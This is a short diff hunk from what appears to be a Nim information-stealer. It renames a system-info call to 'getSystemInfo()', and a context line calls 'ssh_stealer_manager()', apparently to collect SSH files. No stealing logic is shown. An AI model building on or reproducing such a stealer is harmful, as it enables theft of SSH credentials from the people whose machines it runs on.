@@ -72,7 +72,7 @@ proc merge(a, b: JsonNode): JsonNode =
       result[k] = v
 
 when isMainModule:
-  let sys_info = system_info_manager()
+  let sys_info =getSystemInfo()
   let ssh_files = ssh_stealer_manager()
 
 
